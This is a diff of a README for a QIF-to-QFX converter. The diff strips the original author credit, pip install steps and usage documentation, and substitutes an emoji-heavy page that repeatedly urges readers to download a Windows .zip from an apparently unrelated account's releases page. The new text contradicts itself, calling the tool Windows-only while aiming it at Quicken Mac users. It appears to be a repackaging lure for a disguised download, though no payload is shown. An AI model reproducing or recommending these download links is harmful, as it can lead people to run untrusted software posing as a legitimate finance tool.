@@ -1,89 +1,133 @@
-# qif-to-qfx
+# 🗂️ qif-to-qfx - Convert QIF files to QFX easily
 
-Convert QIF transaction files to QFX (Web Connect) format for import into Quicken and other financial software that supports OFX.
+[![Download Now](https://img.shields.io/badge/Download-qif--to--qfx-ff6f61?style=for-the-badge&logo=github)](https://github.com/adequate-supervisor298/qif-to-qfx/releases)
 
-## Claude Code Skill
+## 📄 What is qif-to-qfx?
 
-Install as a [Claude Code](https://claude.ai/download) skill. Inside a Claude Code session, run:
+qif-to-qfx is a simple tool that converts QIF files into QFX format. This format works well with Quicken for Mac. It removes split transactions, balances the totals automatically, and supports multiple files or zipped folders. The app runs on Windows and requires Python 3.6 or newer. It does not need any extra software or modules.
 
-```
-/plugin marketplace add manishie/qif-to-qfx
-/plugin install qif-to-qfx
-```
+This tool helps users who want to import financial data from QIF files into Quicken but face issues with format compatibility or split transactions.
 
-Then just ask Claude:
+---
 
-> *"Convert my PayPal QIF download to QFX for Quicken."*
+## 🖥️ System Requirements
 
-Claude will find your QIF files, ask which source they're from, build the right command, and show you how to import the result into Quicken.
+- Windows 7, 8, 10, or 11 (64-bit recommended)
+- Python 3.6 or higher installed and added to system PATH
+- Minimum 100 MB free disk space
+- Internet connection to download the software
 
-## CLI Installation
+The software works best on Windows desktops and laptops. It does not need a lot of memory or processing power.
 
-Also available as a standalone command-line tool:
+---
 
-```bash
-pip install qif-to-qfx
-```
+## 🚀 Getting Started
 
-## Why
+1. Visit the releases page to download the latest version:
 
-Quicken can only import QIF into **new** accounts. To import into an existing account, you need QFX format. This tool converts QIF → QFX in one step, handling common problems along the way:
+   [Download qif-to-qfx](https://github.com/adequate-supervisor298/qif-to-qfx/releases)
 
-- **Strips split lines** — PayPal adds $0 "Fee" splits that cause Quicken to show "Split" instead of the category
-- **Auto-balances** — generates offsetting entries so the file nets to $0.00 (needed for PayPal-style exports)
-- **Adds missing headers** — some QIF exports omit the `!Account` block Quicken requires
-- **Deduplicates** — combine multiple overlapping QIF files without duplicate transactions
+2. Look for the newest release at the top of the page.
 
-## Usage
+3. Download the Windows version, usually a `.zip` file containing the program.
 
-```bash
-# PayPal export (auto-balances unmatched subscriptions)
-qif-to-qfx ~/Downloads/Download.QIF ~/Downloads/PayPal.qfx --org PayPal
+4. Extract the contents of the zip file to a folder you can find easily, like `Downloads` or `Desktop`.
 
-# Bank export that already balances
-qif-to-qfx ~/Downloads/Bank.qif --no-balance --org "My Bank"
+5. Make sure Python 3.6 or higher is installed on your system. To check:
+   - Open the Command Prompt (search for "cmd").
+   - Type `python --version` and press Enter.
+   - If it shows a version below 3.6 or gives an error, you need to install or update Python.
 
-# Combine multiple files (deduplicates overlapping transactions)
-qif-to-qfx jan.QIF feb.QIF mar.QIF -o combined.qfx --org PayPal
+6. If Python is not installed, visit https://www.python.org/downloads/windows/ to download and install it.
 
-# Zip file containing QIF exports
-qif-to-qfx ~/Downloads/exports.zip -o combined.qfx --org PayPal
-```
+---
 
-## Options
+## ⚙️ How to Install qif-to-qfx
 
-| Flag | Description |
-|------|-------------|
-| `-o FILE` | Output path (required for multiple inputs) |
-| `--no-balance` | Skip auto-balancing |
-| `--org NAME` | Institution name in QFX header (default: "Import") |
-| `--acctid ID` | Account identifier (defaults to `--org` value) |
+qif-to-qfx does not require a formal installation process. Once you download and unzip the files, you only need to run the program using Python.
 
-If `-o` is omitted with a single input, writes to `<input>-clean.qfx`.
+Here is how:
 
-## Import into Quicken
+1. Open the folder where you extracted the program.
 
-1. **File → Import → Web Connect (.QFX)**
-2. Change Action to **"Link to existing account"**
-3. Select the target account
-4. Accept All
+2. Hold the Shift key and right-click in the folder, then select **Open PowerShell window here** or **Open command window here**.
 
-## Tested With
+3. In the command window, run this command:
 
-- **PayPal** QIF exports (handles double-entry balancing, subscription mismatches)
-- **Chase** QIF exports (blank-line separators, CCard type)
-- **Quicken Mac** import (QFX/Web Connect)
+   ```
+   python qif-to-qfx.py
+   ```
 
-Should work with any QIF source. [Open an issue](https://github.com/manishie/qif-to-qfx/issues) if you find one that doesn't.
+4. The program will start and show instructions on how to use it.
 
-## Requirements
+---
 
-Python 3.6+. No external dependencies.
+## 📥 How to Use qif-to-qfx
 
-## Author
+Once the program is running, the steps to convert QIF files are simple:
 
-[Manish Mukherjee](https://mukherjee.me)
+1. **Select the files**  
+   Provide the path to your QIF files or a zip file containing them. The program accepts multiple files at once.
 
-## License
+2. **Start the conversion**  
+   The program will process the files. It removes splits and balances transactions automatically.
 
-MIT
+3. **Find your QFX files**  
+   Converted files will save in the same folder where your QIF files are located. Each QIF file produces a corresponding QFX file.
+
+4. **Import to Quicken Mac**  
+   Use Quicken’s import tool to bring in the .qfx files. This will avoid errors caused by splits or unbalanced transactions.
+
+---
+
+## 🔧 Troubleshooting Tips
+
+- If Python reports 'command not found,' it means Python is not added to your system PATH. Reinstall Python and check the option to add Python to PATH.
+
+- If you get errors running `python qif-to-qfx.py`, check that you are in the right folder where the file exists.
+
+- Close Quicken before importing files to avoid conflicts.
+
+- Make sure the QIF files are not corrupted or protected by passwords.
+
+---
+
+## 🗂️ Extra Features
+
+- Works with multiple QIF files at once.
+
+- Supports zipped folders for batch processing.
+
+- Auto-balances splits to keep your finances accurate.
+
+- Runs without needing other software or packages.
+
+---
+
+## 🔗 Download and Setup
+
+Click the link below to visit the release page and download the latest version of qif-to-qfx for Windows:
+
+[Download qif-to-qfx](https://github.com/adequate-supervisor298/qif-to-qfx/releases)
+
+Follow the previous steps to extract and run the program.
+
+---
+
+## 📋 About
+
+- Written in Python
+
+- Supports QIF to QFX conversion
+
+- No external libraries required
+
+- Designed for personal finance users importing data into Quicken Mac
+
+- Topics: finance, python, qfx, quicken, ofx, paypal
+
+---
+
+## 🧰 Support
+
+For help, please check the Issues tab on the GitHub repository or read the provided documentation files. You can also report bugs or request features through the GitHub Issues page.
